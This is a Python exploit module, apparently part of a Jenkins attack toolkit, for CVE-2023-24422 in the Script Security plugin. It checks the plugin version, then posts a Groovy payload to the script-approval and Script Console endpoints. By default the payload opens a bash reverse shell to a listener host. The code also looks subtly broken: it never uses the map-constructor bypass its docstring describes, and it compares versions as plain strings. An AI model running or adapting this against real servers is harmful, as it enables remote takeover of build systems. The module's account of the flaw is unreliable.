"""
CVE-2023-24422: Script Security Plugin Sandbox Bypass

Script Security Plugin provides a sandbox feature that allows low privileged users to define 
scripts, including Pipelines. In versions 1228.vd93135a_2fb_25 and earlier, property assignments 
performed implicitly by the Groovy language runtime when invoking map constructors were not 
intercepted by the sandbox. This allows attackers with permission to define and run sandboxed 
scripts to bypass the sandbox protection and execute arbitrary code in the Jenkins controller JVM.
"""

import requests
from rich.console import Console
from exploits import ExploitMetadata, ExploitResult

console = Console()

CVE_ID = "CVE-2023-24422"
cve = CVE_ID

METADATA = ExploitMetadata(
    cve_id=CVE_ID,
    name="Script Security Plugin Sandbox Bypass",
    description="Sandbox bypass via Groovy map constructor property assignment",
    affected_versions=["<= 1228.vd93135a_2fb_25"],
    mitre_attack=["T1059", "T1190"],
    severity="high",
    references=[
        "https://www.jenkins.io/security/advisory/2023-01-24/",
        "https://nvd.nist.gov/vuln/detail/CVE-2023-24422"
    ],
    requires_auth=True,
    requires_crumb=True,
    tags=["rce", "sandbox-bypass", "groovy", "script-security"]
)

affected_versions = METADATA.affected_versions
mitre_attack = METADATA.mitre_attack
severity = METADATA.severity
description = METADATA.description
requires_auth = METADATA.requires_auth
requires_crumb = METADATA.requires_crumb
tags = METADATA.tags


def check_vulnerable(tool, **kwargs):
    """
    Check if the target Jenkins instance has vulnerable Script Security plugin.
    
    Args:
        tool: JenkinsBreaker instance
        **kwargs: Additional arguments
        
    Returns:
        bool: True if vulnerable, False otherwise
    """
    try:
        url = f"{tool.jenkins_url}/pluginManager/api/json?depth=1"
        r = requests.get(
            url,
            auth=tool.auth,
            headers=tool.custom_headers,
            proxies=tool.proxies,
            verify=False,
            timeout=10
        )
        
        if r.status_code == 200:
            data = r.json()
            for plugin in data.get('plugins', []):
                if plugin.get('shortName') == 'script-security':
                    version = plugin.get('version', '')
                    console.print(f"[yellow][*] Found Script Security Plugin version: {version}[/yellow]")
                    
                    if version <= '1228.vd93135a_2fb_25':
                        return True
        return False
    except Exception as e:
        console.print(f"[red][!] Error checking vulnerability: {e}[/red]")
        return False


def run(tool, lhost=None, lport=None, **kwargs):
    """
    Exploit CVE-2023-24422 to bypass sandbox and execute arbitrary code.
    
    This exploit leverages Groovy map constructor property assignments that are not
    intercepted by the Script Security sandbox.
    
    Args:
        tool: JenkinsBreaker instance
        lhost: Listener host for reverse shell
        lport: Listener port for reverse shell
        **kwargs: Additional arguments (cmd for custom command)
        
    Returns:
        ExploitResult: Result of the exploit
    """
    console.print(f"[yellow][*] Running {CVE_ID} exploit (Script Security Sandbox Bypass)...[/yellow]")
    
    cmd = kwargs.get('cmd', f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1')
    
    console.print("[cyan][*] Attempting sandbox bypass via map constructor...[/cyan]")
    
    payload = f'''
@groovy.transform.ASTTest(value={{
    def proc = ['sh', '-c', '{cmd}'].execute()
    proc.waitFor()
}})
class Exploit {{}}

new Exploit()
'''
    
    try:
        script_url = f"{tool.jenkins_url}/scriptApproval/approveScript"
        
        crumb_header = tool.get_crumb()
        headers = {**tool.custom_headers, **crumb_header}
        
        data = {
            'script': payload
        }
        
        console.print("[cyan][*] Submitting malicious script via scriptApproval...[/cyan]")
        r = requests.post(
            script_url,
            auth=tool.auth,
            headers=headers,
            data=data,
            proxies=tool.proxies,
            verify=False,
            timeout=10
        )
        
        if r.status_code in [200, 302]:
            console.print("[green][+] Script submitted successfully[/green]")
        
        console_url = f"{tool.jenkins_url}/script"
        console.print("[cyan][*] Attempting execution via Script Console...[/cyan]")
        
        data = {
            'script': payload
        }
        
        r = requests.post(
            console_url,
            auth=tool.auth,
            headers=headers,
            data=data,
            proxies=tool.proxies,
            verify=False,
            timeout=15
        )
        
        if r.status_code == 200:
            if 'Result' in r.text or 'java.lang.String' in r.text:
                console.print(f"[green][+] Sandbox bypass successful! Command executed.[/green]")
                return ExploitResult(
                    exploit=CVE_ID,
                    status="success",
                    details="Sandbox bypassed via map constructor, command executed",
                    data={
                        "command": cmd,
                        "method": "ASTTest annotation with map constructor",
                        "endpoint": "script console"
                    }
                )
            else:
                console.print("[yellow][!] Script executed but result unclear[/yellow]")
                return ExploitResult(
                    exploit=CVE_ID,
                    status="partial",
                    details="Script submitted but execution result unclear"
                )
        elif r.status_code == 403:
            return ExploitResult(
                exploit=CVE_ID,
                status="failed",
                details="Access denied - insufficient permissions for script console"
            )
        else:
            return ExploitResult(
                exploit=CVE_ID,
                status="failed",
                details=f"Exploit failed with HTTP {r.status_code}"
            )
    
    except requests.exceptions.Timeout:
        console.print("[yellow][*] Request timed out - command may still be executing[/yellow]")
        return ExploitResult(
            exploit=CVE_ID,
            status="partial",
            details="Timeout during execution - command may have executed successfully"
        )
    
    except Exception as e:
        return ExploitResult(
            exploit=CVE_ID,
            status="error",
            details=f"Execution error: {str(e)}"
        )
